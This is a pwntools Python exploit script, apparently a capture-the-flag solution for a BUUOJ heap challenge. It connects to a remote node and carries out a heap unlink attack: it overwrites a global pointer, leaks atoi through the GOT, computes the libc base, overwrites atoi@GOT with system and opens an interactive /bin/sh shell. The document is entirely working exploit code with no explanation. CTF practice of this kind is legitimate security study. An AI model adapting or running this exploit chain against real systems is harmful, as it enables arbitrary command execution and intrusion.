from pwn import *

sh=remote("node5.buuoj.cn",27679)
elf=ELF("./timu")
libc=ELF("./libc-2.23.so")

def alloc(length,name):
	sh.recvuntil(b":")
	sh.sendline(b'2')
	sh.recvuntil(b':')
	sh.sendline(str(length))
	sh.recvuntil(b":")
	sh.sendline(name)
 
def edit(idx,length,name):
	sh.recvuntil(b':')
	sh.sendline(b'3')
	sh.recvuntil(b":")
	sh.sendline(str(idx))
	sh.recvuntil(b":")
	sh.sendline(str(length))
	sh.recvuntil(b':')
	sh.sendline(name)
 
def free(idx):
	sh.recvuntil(b":")
	sh.sendline(b"4")
	sh.recvuntil(b":")
	sh.sendline(str(idx))
 
def show():
	sh.recvuntil(b":")
	sh.sendline(b"1")

ptr=0x00000000006020C0+8
atoi_got=elf.got["atoi"]

alloc(0x40,b'aaaa') #0
alloc(0x80,b'bbbb') #1
alloc(0x80,b'cccc') #2

payload=p64(0)+p64(0x41)+p64(ptr-0x18)+p64(ptr-0x10)+0x20*b'a'+p64(0x40)+p64(0x90)
edit(0,len(payload),payload)
free(1)

payload1=p64(0)*2+p64(0x40)+p64(atoi_got)
edit(0,len(payload1),payload1)
show()

sh.recvuntil(b'0 : ')
atoi_addr=u64(sh.recv(6).ljust(8,b'\x00'))

libc_base=atoi_addr-libc.sym["atoi"]
print("libc_base=",hex(libc_base))
system_addr=libc_base+libc.sym["system"]
binsh=libc_base+next(libc.search(b"/bin/sh\x00"))

edit(0,8,p64(system_addr))
sh.sendline(b"/bin/sh\x00")

sh.interactive()
